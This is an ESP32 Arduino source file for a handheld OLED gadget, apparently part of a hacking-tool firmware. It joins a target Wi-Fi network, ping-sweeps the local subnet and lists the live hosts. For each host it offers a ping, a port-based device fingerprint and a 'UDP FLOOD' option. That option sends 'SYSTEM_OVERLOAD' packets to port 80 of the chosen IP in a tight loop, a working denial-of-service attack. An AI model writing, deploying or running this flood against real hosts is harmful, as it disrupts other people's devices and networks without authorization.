#include "ip_scanner.h"
#include <U8g2lib.h>
#include <WiFi.h>
#include <ESP32Ping.h>
#include <AsyncUDP.h>
#include <esp_wifi.h>

// Referencias externas a variables del main
extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;
extern String target_ssid;
extern bool runningApp;

// Variables internas del módulo
int current_scan_ip = 1;
int found_ips = 0;
bool scanFinished = false;
String foundList[20]; 
int list_selection = 0;
int scroll_offset = 0;
bool inSubMenu = false;
int subMenuIndex = 0;
String selectedIP = "";
const char* subMenuLabels[] = {"1. PING TEST", "2. UDP FLOOD", "3. PORT SCAN", "<- VOLVER"};

// --- FUNCIONES DE APOYO 

void runPingAction(String ip) {
    u8g2.clearBuffer(); u8g2.drawStr(10, 30, "PINGING..."); u8g2.sendBuffer();
    bool success = Ping.ping(ip.c_str(), 3);
    u8g2.clearBuffer(); u8g2.setCursor(10, 30);
    u8g2.print(success ? "RESPONDE: SI" : "RESPONDE: NO");
    u8g2.drawStr(10, 50, "BACK (25): VOLVER"); u8g2.sendBuffer();
    while(digitalRead(25) == HIGH); delay(200);
}

void runFloodAction(String ip) {
    AsyncUDP udp;
    u8g2.clearBuffer(); u8g2.drawStr(10, 20, "FLOODING...");
    u8g2.drawStr(10, 40, "BACK (25): DETENER"); u8g2.sendBuffer();
    while(digitalRead(25) == HIGH) {
        udp.writeTo((uint8_t*)"SYSTEM_OVERLOAD", 15, IPAddress().fromString(ip), 80);
        delay(1);
    }
    delay(200);
}

void runScanAction(String ip) {
    u8g2.clearBuffer(); u8g2.drawStr(10, 15, "IDENTIFICANDO..."); u8g2.sendBuffer();
    int ports[] = {80, 443, 135, 445, 62078, 8008, 7000, 5000};
    String info = "Desconocido";
    for(int p : ports) {
        WiFiClient c;
        if (c.connect(ip.c_str(), p, 300)) {
            if (p == 62078 || p == 7000) info = "Apple Device";
            else if (p == 135 || p == 445) info = "Windows PC";
            else if (p == 8008 || p == 8009) info = "Google/IoT";
            else if (p == 80 || p == 443) info = "Web/Server";
            else if (p == 5000) info = "Samsung/NAS";
            else info = "Puerto Activo";
            c.stop(); break;
        }
    }
    u8g2.setCursor(10, 40); u8g2.print(info);
    u8g2.drawStr(10, 55, "BACK (25): VOLVER"); u8g2.sendBuffer();
    while(digitalRead(25) == HIGH); delay(200);
}

void drawIPSubMenu() {
    u8g2.clearBuffer(); u8g2.setFont(u8g2_font_6x12_tr);
    u8g2.drawStr(5, 12, "OBJETIVO: ");
    u8g2.setCursor(75, 12); u8g2.print(selectedIP.substring(selectedIP.lastIndexOf('.')));
    u8g2.drawHLine(0, 15, 128);
    for (int i = 0; i < 4; i++) {
        u8g2.setCursor(10, 30 + (i * 11));
        if (subMenuIndex == i) u8g2.print("> "); else u8g2.print("  ");
        u8g2.print(subMenuLabels[i]);
    }
    u8g2.sendBuffer();
}

// --- FUNCIONES PRINCIPALES ---

void ipScannerSetup() {
    found_ips = 0; current_scan_ip = 1; scanFinished = false; 
    list_selection = 0; scroll_offset = 0; inSubMenu = false;
    for(int i=0; i<20; i++) foundList[i] = "";
    if (WiFi.status() != WL_CONNECTED) {
        u8g2.clearBuffer(); u8g2.setFont(u8g2_font_6x12_tr);
        u8g2.drawStr(10, 25, "OBJETIVO Red:");
        u8g2.setCursor(10, 40); u8g2.print(target_ssid);
        u8g2.drawStr(10, 55, "Conectando..."); u8g2.sendBuffer();
        WiFi.begin(target_ssid.c_str()); 
        int t = 0; while(WiFi.status() != WL_CONNECTED && t < 20) { delay(500); t++; }
    }
}

void ipScannerLoop() {
    if (digitalRead(25) == LOW) { // BTN_BACK
        if (inSubMenu) { inSubMenu = false; delay(300); return; } 
        else { esp_wifi_set_promiscuous(false); runningApp = false; WiFi.mode(WIFI_OFF); delay(300); return; }
    }
    
    if (inSubMenu) {
        drawIPSubMenu();
        if (digitalRead(26) == LOW) { subMenuIndex--; if(subMenuIndex < 0) subMenuIndex = 3; delay(200); }
        if (digitalRead(33) == LOW) { subMenuIndex++; if(subMenuIndex > 3) subMenuIndex = 0; delay(200); }
        if (digitalRead(32) == LOW) {
            delay(200);
            if (subMenuIndex == 0) runPingAction(selectedIP);
            else if (subMenuIndex == 1) runFloodAction(selectedIP);
            else if (subMenuIndex == 2) runScanAction(selectedIP);
            else if (subMenuIndex == 3) { inSubMenu = false; delay(200); }
        }
        return;
    }

    u8g2.clearBuffer(); u8g2.setFont(u8g2_font_6x12_tr);
    if (WiFi.status() != WL_CONNECTED) {
        u8g2.drawStr(15, 35, "FALLO WIFI");
    } else if (!scanFinished) {
        u8g2.drawStr(25, 12, "ESCANEANDO..."); u8g2.drawHLine(0, 15, 128);
        IPAddress ip = WiFi.localIP(); ip[3] = current_scan_ip;
        u8g2.setCursor(10, 35); u8g2.print("IP: ."); u8g2.print(current_scan_ip);
        if (Ping.ping(ip, 1)) {
            if (found_ips < 20) foundList[found_ips] = ip.toString();
            found_ips++;
        }
        current_scan_ip++; if (current_scan_ip > 254) scanFinished = true;
        u8g2.drawFrame(10, 58, 108, 4); u8g2.drawBox(12, 59, (current_scan_ip * 104) / 254, 2);
    } else {
        u8g2.drawStr(5, 12, "IPS ENCONTRADAS:"); u8g2.drawHLine(0, 14, 128);
        if (digitalRead(26) == LOW) { list_selection--; delay(150); }
        if (digitalRead(33) == LOW) { list_selection++; delay(150); }
        list_selection = constrain(list_selection, 0, max(0, found_ips - 1));
        if (list_selection < scroll_offset) scroll_offset = list_selection;
        if (list_selection >= scroll_offset + 4) scroll_offset = list_selection - 3;
        
        for (int i = 0; i < 4; i++) {
            int idx = scroll_offset + i;
            if (idx < found_ips) {
                u8g2.setCursor(5, 28 + (i * 11));
                u8g2.print(idx == list_selection ? "> " : "  ");
                u8g2.print(foundList[idx]);
            }
        }
        if (digitalRead(32) == LOW) {
            selectedIP = foundList[list_selection];
            inSubMenu = true; subMenuIndex = 0; delay(300);
        }
    }
    u8g2.sendBuffer();
}